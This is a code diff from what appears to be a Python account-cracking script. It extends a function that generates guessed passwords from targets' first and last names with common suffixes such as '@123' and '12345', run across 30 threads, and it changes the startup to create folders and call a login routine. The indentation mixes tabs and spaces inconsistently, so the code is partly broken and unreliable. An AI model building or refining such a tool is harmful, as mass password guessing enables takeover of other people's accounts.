@@ -548,15 +548,31 @@ def passwrd():
     print(f'\x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37mUSE FLIGHT MODE FOR SPEED UP ')
     print('\x1b[38;5;231m--------------------------------------------------')
     with tred(max_workers=30) as pool:
-        for yuzong in id2:
-            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-            frs = nmf.split(' ')[0]
-            pwv = []
-            if len(nmf)<6:
-                if len(frs)<3:
-                    pass
-                else:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			pwv = []
+			frs = nmf.split(' ')[0]
+			try:
+				lst = nmf.split(' ')[1]
+			except:
+				lst = ''
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
                     pwv.append(nmf)
+                    pwv.append(frs+lst+'@12')
+                    pwv.append(frs+lst+'@123')
+                    pwv.append(frs+lst+'@1234')
+                    pwv.append(frs+lst+'@12345')
+                    pwv.append(frs+lst+'12')
+                    pwv.append(frs+lst+'123')
+                    pwv.append(frs+lst+'1234')
+                    pwv.append(frs+lst+'12345')
+                    pwv.append(frs+'@'+lst)
+					pwv.append(frs+'#'+lst)
+					pwv.append(frs+lst+'@')
+					pwv.append(frs+'@')
                     pwv.append(frs+'@12')
                     pwv.append(frs+'12')
                     pwv.append(frs+'123')
@@ -570,6 +586,18 @@ def passwrd():
                     pwv.append(nmf)
                 else:
                     pwv.append(nmf)
+                    pwv.append(frs+lst+'@12')
+                    pwv.append(frs+lst+'@123')
+                    pwv.append(frs+lst+'@1234')
+                    pwv.append(frs+lst+'@12345')
+                    pwv.append(frs+lst+'12')
+                    pwv.append(frs+lst+'123')
+                    pwv.append(frs+lst+'1234')
+                    pwv.append(frs+lst+'12345')
+                    pwv.append(frs+'@'+lst)
+					pwv.append(frs+'#'+lst)
+					pwv.append(frs+lst+'@')
+					pwv.append(frs+'@')
                     pwv.append(frs+'@12')
                     pwv.append(frs+'12')
                     pwv.append(frs+'123')
@@ -717,10 +745,10 @@ def cek_apk(session,coki):
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
  
 if __name__=='__main__':
-    try:os.mkdir('OK')
-    except:pass
-    try:os.mkdir('CP')
-    except:pass
-    try:os.system('touch .prox.txt')
-    except:pass
-menu()
+	try:os.mkdir('/sdcard/MANAS')
+	except:pass
+	try:os.mkdir('data')
+	except:pass
+	try:os.system('touch .prox.txt')
+	except:pass
+	login()
